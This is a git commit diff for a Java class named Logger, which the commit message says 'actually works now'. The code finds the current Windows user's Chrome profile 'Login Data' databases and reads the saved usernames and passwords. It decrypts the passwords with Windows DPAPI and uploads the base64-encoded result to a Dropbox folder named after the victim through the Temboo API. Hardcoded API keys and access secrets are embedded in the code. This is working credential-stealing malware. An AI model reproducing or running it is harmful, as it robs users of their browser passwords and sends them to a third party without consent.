abef2cca46ffcfabb313e3df1138a23edba053a8
aadhi0319 <aadhi0319@users.noreply.github.com>
2017-02-11 20:23:56 -0600

    Version 1.5
    Major fixes (the code actually works now).
    Completely rewritten code for all the process the java file claimed to do before.

--- Logger.java
+++ Logger.java
@@ -3,11 +3,10 @@ import java.io.FilenameFilter;
 import java.sql.Connection;
 import java.sql.DriverManager;
 import java.sql.ResultSet;
+import java.sql.SQLException;
 import java.sql.Statement;
 import java.util.ArrayList;
-import java.util.Arrays;
-
-import org.apache.commons.codec.binary.Base64;
+import java.util.Base64;
 
 import com.sun.jna.platform.win32.Crypt32Util;
 import com.temboo.Library.Dropbox.FilesAndMetadata.UploadFile;
@@ -16,22 +15,44 @@ import com.temboo.Library.Dropbox.FilesAndMetadata.UploadFile.UploadFileResultSe
 import com.temboo.core.TembooException;
 import com.temboo.core.TembooSession;
 
-public class Logger{
-		private String filepath = "C:\\Users\\"+System.getProperty("user.name")+"\\AppData\\Local\\Google\\Chrome\\User Data";
-		public Logger() throws TembooException{
-		    run();
+public class Logger {
+
+	private String user = System.getProperty("user.name");
+	private String filepath = "C:\\Users\\"+user+"\\AppData\\Local\\Google\\Chrome\\User Data\\";
+	
+	public Logger() throws SQLException, TembooException {
+		run();
+	}
+	
+	public void run() throws SQLException, TembooException{
+		ArrayList<String> files = getFiles();
+		ArrayList<ArrayList<String>> passwords = new ArrayList<ArrayList<String>>();
+		ArrayList<ArrayList<String>> usernames = new ArrayList<ArrayList<String>>();
+		ArrayList<ResultSet> results = new ArrayList<ResultSet>();
+		ArrayList<ResultSet> results2 = new ArrayList<ResultSet>();
+		String uploadInfo = "";
+		for(String i : files){
+			results.add(getResultSet(i));
+			results2.add(getResultSet(i));
 		}
-		
-		public void run() throws TembooException{
-			String user = System.getProperty("user.name");
-		    ArrayList<String> folders = new ArrayList<String>();
-		    ArrayList<String> usernames = new ArrayList<String>();
-		    ArrayList<String> passwords = new ArrayList<String>();
-		    ArrayList<ArrayList<String>> doublebuffer = new ArrayList<ArrayList<String>>();
-		    ArrayList<String> bufferuser = new ArrayList<String>();
-		    ArrayList<String> bufferpass = new ArrayList<String>();
-		    File file = new File(filepath);
-		    String[] directories = file.list(new FilenameFilter() {
+		for(ResultSet i : results){
+			passwords.add(getPass(i));
+		}
+		for(ResultSet i : results2){
+			usernames.add(getUser(i));
+		}
+		for(int i = 0; i < usernames.size(); i++){
+			for(int j = 0; j < usernames.get(i).size(); j++){
+				uploadInfo+="Username: "+usernames.get(i).get(j)+"\tPasswords: "+passwords.get(i).get(j)+"\n";
+			}
+		}
+		upload(uploadInfo);
+	}
+	
+	public ArrayList<String> getFiles(){
+		ArrayList<String> folders = new ArrayList<String>();
+		File file = new File(filepath);
+		String[] directories = file.list(new FilenameFilter() {
 		      @Override
 		      public boolean accept(File current, String name) {
 		        return new File(current, name).isDirectory();
@@ -39,94 +60,79 @@ public class Logger{
 		    });
 		    for(String i : directories){
 		    	if(i.matches("^(Default|Profile).*")){
-		    		folders.add(i);
+		    		folders.add(filepath+i+"\\Login Data");
 		    	}
 		    }
-		    System.out.println(folders.toString());
-		    for(String i : folders){
-		    	doublebuffer = getinfo(filepath+"\\"+i+"\\Login Data");
-		    	bufferuser = doublebuffer.get(0);
-		    	bufferpass = doublebuffer.get(1);
-		    	for(String j : bufferpass)
-		    		passwords.add(j);
-		    	for(String k : bufferuser)
-		    		usernames.add(k);
-		    }
-		    String uploadInfo = "";
-		    for(int i = 0; i < passwords.size(); i++){
-		    	uploadInfo+="Username: "+usernames.get(i)+"\tPassword: "+passwords.get(i)+"\n";
-		    }
-		    upload(uploadInfo);
-		}
-		
-		@SuppressWarnings("null")
-		public ArrayList<ArrayList<String>> getinfo(String file){
-			try{
-			    Class.forName("org.sqlite.JDBC");
-				Connection connection = DriverManager.getConnection("jdbc:sqlite:"+file);
-				Statement statement = connection.createStatement();
-				ResultSet resultSet = statement.executeQuery("SELECT username_value, password_value FROM logins"); // some encrypted field
-				ArrayList<String> passwords = new ArrayList<String>(); 
-				ArrayList<String> usernames = new ArrayList<String>();
-				ArrayList<ArrayList<String>> buffer = new ArrayList<ArrayList<String>>();
-				while (resultSet.next())
-			    {
-			        byte[] encryptedData = resultSet.getBytes(2);
-			        byte[] decryptedData = Crypt32Util.cryptUnprotectData(encryptedData);  // exception over here
-			        byte[] users = resultSet.getBytes(1);
-			        StringBuilder decryptedString = new StringBuilder();
-			        StringBuilder userstring = new StringBuilder();
-		
-			        for (byte b : decryptedData)
-			        {
-			           decryptedString.append((char) b);
-			        }
-			        for (byte b : decryptedData)
-			        {
-			           userstring.append((char) b);
-			        }
-			        
-			        
-			        System.out.println("decrypted = [" + decryptedString + "]");
-			        usernames.add(userstring.toString());
-			        passwords.add(decryptedString.toString());
-			        buffer.add(usernames);
-			        buffer.add(passwords);
-			        return buffer;
-			   }
-			   connection.close();
-			 }catch(Exception e)
-			 {
-			    e.printStackTrace();
-			 }
-			return null; 
-		}
-		
-		public void upload(String info) throws TembooException{
-			// Instantiate the Choreo, using a previously instantiated TembooSession object, eg:
-			TembooSession session = new TembooSession("logger", "myFirstApp", "N5LS8WVzNyNEKSDrXLVWNFL3nlypo7vr");
+		return folders;
+	}
 
-			UploadFile uploadFileChoreo = new UploadFile(session);
+	public ResultSet getResultSet(String file){
+		try{
+		    Class.forName("org.sqlite.JDBC");
+			Connection connection = DriverManager.getConnection("jdbc:sqlite:"+file);
+			Statement statement = connection.createStatement();
+			ResultSet resultSet = statement.executeQuery("SELECT username_value, password_value FROM logins"); // some encrypted field
+			return resultSet;			
+		 }catch(Exception e){
+		    e.printStackTrace();
+		 }
+		return null;
+	}
+	
+	public ArrayList<String> getPass(ResultSet r) throws SQLException{
+		ArrayList<String> passwords = new ArrayList<String>(); 
+		while (r.next())
+	    {
+	        byte[] decryptedData = Crypt32Util.cryptUnprotectData(r.getBytes(2));  // exception over here
+	        StringBuilder decryptedString = new StringBuilder();
 
-			// Get an InputSet object for the choreo
-			UploadFileInputSet uploadFileInputs = uploadFileChoreo.newInputSet();
-			Base64 encode = new Base64();
-			// Set inputs
-			uploadFileInputs.set_ResponseFormat("json");
-			uploadFileInputs.set_FileContents(encode.encodeToString(info.getBytes()));
-			uploadFileInputs.set_Root("sandbox");
-			uploadFileInputs.set_AccessToken("jvm9xp5ea4kuk06g");
-			uploadFileInputs.set_AppKey("bwr2bxarafudtxj");
-			uploadFileInputs.set_FileName("information.txt");
-			uploadFileInputs.set_AccessTokenSecret("xh4d5f5yjflzyl7");
-			uploadFileInputs.set_Folder("/RootFolder/"+System.getProperty("user.name"));
-			uploadFileInputs.set_AppSecret("tr0phzmsc74vauv");
+	        for (byte b : decryptedData)
+	        {
+	           decryptedString.append((char) b);
+	        }
+	        passwords.add(decryptedString.toString());	        
+	   }
+		return passwords;
+	}
+	
+	public ArrayList<String> getUser(ResultSet r) throws SQLException{
+		ArrayList<String> usernames = new ArrayList<String>(); 
+		while (r.next())
+	    {
+	        byte[] userData = r.getBytes(1);  // exception over here
+	        StringBuilder userString = new StringBuilder();
 
-			// Execute Choreo
-			UploadFileResultSet uploadFileResults = uploadFileChoreo.execute(uploadFileInputs);
-		}
-		
-		public void append(String info){
-			
-		}
+	        for (byte b : userData)
+	        {
+	           userString.append((char) b);
+	        }
+	        usernames.add(userString.toString());	
+	   }
+		return usernames;
+	}
+	
+	public void upload(String info) throws TembooException{
+		// Instantiate the Choreo, using a previously instantiated TembooSession object, eg:
+		TembooSession session = new TembooSession("logger", "myFirstApp", "N5LS8WVzNyNEKSDrXLVWNFL3nlypo7vr");
+
+		UploadFile uploadFileChoreo = new UploadFile(session);
+
+		// Get an InputSet object for the choreo
+		UploadFileInputSet uploadFileInputs = uploadFileChoreo.newInputSet();
+		// Set inputs
+		uploadFileInputs.set_ResponseFormat("json");
+		uploadFileInputs.set_FileContents(Base64.getEncoder().encodeToString(info.getBytes()));
+		uploadFileInputs.set_Root("sandbox");
+		uploadFileInputs.set_AccessToken("jvm9xp5ea4kuk06g");
+		uploadFileInputs.set_AppKey("bwr2bxarafudtxj");
+		uploadFileInputs.set_FileName("information.txt");
+		uploadFileInputs.set_AccessTokenSecret("xh4d5f5yjflzyl7");
+		uploadFileInputs.set_Folder("/RootFolder/"+System.getProperty("user.name"));
+		uploadFileInputs.set_AppSecret("tr0phzmsc74vauv");
+
+		// Execute Choreo
+		UploadFileResultSet uploadFileResults = uploadFileChoreo.execute(uploadFileInputs);
+	}
 }
+
+
